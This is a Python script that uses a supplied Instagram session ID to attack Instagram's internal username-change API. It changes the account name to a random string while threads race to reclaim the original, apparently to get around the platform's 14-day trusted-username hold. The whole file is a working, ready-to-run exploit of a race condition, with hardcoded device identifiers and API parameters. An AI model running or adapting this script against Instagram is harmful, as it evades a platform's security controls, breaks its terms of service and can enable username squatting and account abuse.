import os
import sys
import requests, time, random, string, threading
session_bypass = sys.argv[1]
headers = {}
headers['User-Agent'] =  "Instagram 297.0.0.39.120 Android (30/11; 480dpi; 1080x2168; samsung; SM-G780F; r8s; exynos990; en_US; 321039115)"
headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
headers["Cookie"] = "sessionid=" + session_bypass
def GetInfo():
	print("⏳ Checking Session ID...")
	req = requests.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers=headers, cookies={"sessionid": session_bypass})
	r = req.json()
	try:
		ust = r["user"]["username"]
		print("✅ Logged in: @" + ust)
		fbid = r["user"]["fbid_v2"]
		print("⏳ Checking Trust Username ...")
		urt = ""
		try:
			urt = r["user"]["trusted_username"]
		except:
			pass
		if urt == ust:
			print("✅ @" + ust + ", is 14 Days")
			print(f"⏳ Waiting Bypass: @" + ust + " ...")
			return urt, ust, fbid
		else:
			print(f"❌ @{ust}, isn't 14 Days")
			print("🙏 Thank You For Using <3")
			time.sleep(1)
			os._exit(0)
	except:
		print(f"❌ Invalid session ID!")
		print("🙏 Thank You For Using <3")
		time.sleep(1)
		os._exit(0)
	return "Error","Error", "Error"
trusted, username, fbid = GetInfo()
def CheckBypass():
	req = requests.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers=headers, cookies={"sessionid": session_bypass})
	r = req.json()
	ust = r["user"]["username"]
	urt = r["user"]["trusted_username"]
	if urt != trusted:
		if ust == username:
			print(f"✅ Successfully Bypass")
		else:
			print(f"💀 Successfully Bypass, But Killed")
		print("🙏 Thank You For Using <3")
		time.sleep(1)
		os._exit(0)
	else:
		print(f"❌ Failed Bypass")
		print("🙏 Thank You For Using <3")
		time.sleep(1)
		os._exit(0)
def ChangeUser():
	xx = ''.join(random.choice(string.ascii_lowercase + string.digits)for i in range(10))
	rp = requests.post("https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.fxim.settings.username.change.async/", headers=headers, data = "params={\"client_input_params\":{\"username\":\"" + xx + "\",\"family_device_id\":\"7ccc1623-ec98-4bca-bc56-30050d1f66e6\"},\"server_params\":{\"INTERNAL__latency_qpl_marker_id\":36707139,\"INTERNAL__latency_qpl_instance_id\":187453317500140,\"operation_type\":\"MUTATE\",\"identity_ids_DEPRECATED\":\"" + str(fbid) + "\",\"INTERNAL_INFRA_THEME\":\"default\"}}&_uuid=99b58fab-9663-4eb8-88cb-0a5c51dff6ff&bk_client_context={\"bloks_version\":\"8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07\",\"styles_id\":\"instagram\"}&bloks_versioning_id=8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07", cookies={"sessionid": session_bypass}).text
	if xx in rp:
		print(f"✅ Changed Username Bypass !")
	else:
		print(f"❌ Spam Account !")
		print("🙏 Thank You For Using <3")
		time.sleep(1)
		os._exit(0)
def Attempts():
	while True:
		try:
			data = "params={\"client_input_params\":{\"username\":\"" + username + "\",\"family_device_id\":\"7ccc1623-ec98-4bca-bc56-30050d1f66e6\"},\"server_params\":{\"INTERNAL__latency_qpl_marker_id\":36707139,\"INTERNAL__latency_qpl_instance_id\":187453317500140,\"operation_type\":\"MUTATE\",\"identity_ids_DEPRECATED\":\"" + str(fbid) + "\",\"INTERNAL_INFRA_THEME\":\"default\"}}&_uuid=99b58fab-9663-4eb8-88cb-0a5c51dff6ff&bk_client_context={\"bloks_version\":\"8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07\",\"styles_id\":\"instagram\"}&bloks_versioning_id=8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07"
			requests.post("https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.fxim.settings.username.change.async/", headers=headers, data=data, timeout=1).text
		except:
			pass
for _ in range(2):
	threading.Thread(target=Attempts).start()
ChangeUser()
time.sleep(1)

CheckBypass()
